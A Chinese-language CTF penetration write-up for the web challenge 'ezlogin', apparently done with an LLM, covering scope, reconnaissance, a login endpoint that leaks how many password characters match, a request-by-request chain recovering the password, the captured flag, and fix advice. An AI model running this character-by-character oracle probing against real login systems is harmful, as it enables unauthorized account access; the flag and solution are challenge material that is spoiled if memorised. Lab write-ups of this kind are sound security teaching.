# ezlogin · 渗透记录

## 2.1 基本信息
| 字段 | 内容 |
|---|---|
| 题目 | ezlogin |
| 类型 | Web / 登录逻辑（字符级侧信道） |
| 入口 | http://wg4j5e363xxpdbf4.neu-nex.fun |
| 耗时 | 0 日 0 时 2 分 30 秒 |
| LLM | deepseek-flash |
| flag | `nex{oNE_0f_A_k1nD_3y3iye1p}` |

## 2.2 目标与授权
- 授权范围：仅题目域名 80 端口；只读探测，未做字典爆破/破坏性操作
- 禁止动作：DoS、横向移动、持久化、读取无关数据

## 2.3 侦察与指纹
首页单 password 表单 action=/verify（GET），无用户名字段；/verify 返回 application/json；错误固定 400 + `Password incorrect. Matched N chars.`，正确 200 + flag；其余路径 500

## 2.4 攻击面
1) GET /verify?password=<REDACTED> GET /（登录表单，仅提示字段名）

## 2.5 漏洞判定
- 类型：Web / 登录逻辑（字符级侧信道）
- 位置：/verify?password=
- 证据：evidence/step3_resp.txt（200 + flag）；evidence/step4_solver_run.txt（exp.py 从零恢复 16 位密码）；evidence/step2a/b/c_resp.txt（oracle 语义三组对照）
- 误报排除：不是前缀判定：xSxxxxxxxx 命中 0（S 在第 0 位才对）、xxcr3t 命中 4（中间位 c/r/3/t 对齐才计）→ 位置对齐逐位比较；长度不参与：S3cr3tXXXXXXX 仍为 6；错误密码 400、成功 200，状态码与 JSON 双信号一致

## 2.6 利用链
```
GET /verify?password=S                    -> 400 Matched 1 chars
GET /verify?password=<REDACTED>            -> 400 Matched 0 chars（否定前缀判定）
GET /verify?password=<REDACTED>                -> 400 Matched 4 chars（位置对齐）
逐位扩展：count(prefix+c)==len(prefix)+1 即下一位正确
  S -> S3 -> S3c -> S3cr -> S3cr3 -> S3cr3t -> S3cr3tP -> ... -> S3cr3tP@ssw0rd123
GET /verify?password=<REDACTED>   -> 200 {"flag":"nex{oNE_0f_A_k1nD_3y3iye1p}","success":true}
```

## 2.7 影响
无需字典即可还原 16 位密码并登录；同等逻辑若用于真实账号，任意口令可被逐位还原（信息泄露导致认证绕过）

## 2.8 修复建议
不要在错误响应里回显“匹配了多少位”；用 password_verify/hash_equals 做整串常量时间比较，统一错误文案与状态码；对 /verify 加限速与失败计数

## 2.9 复盘
首猜 S3cr3t 命中 6 只说明 6 位对；确认按位置计数后逐位扩展，16×~70 次请求出密码，没走字典。
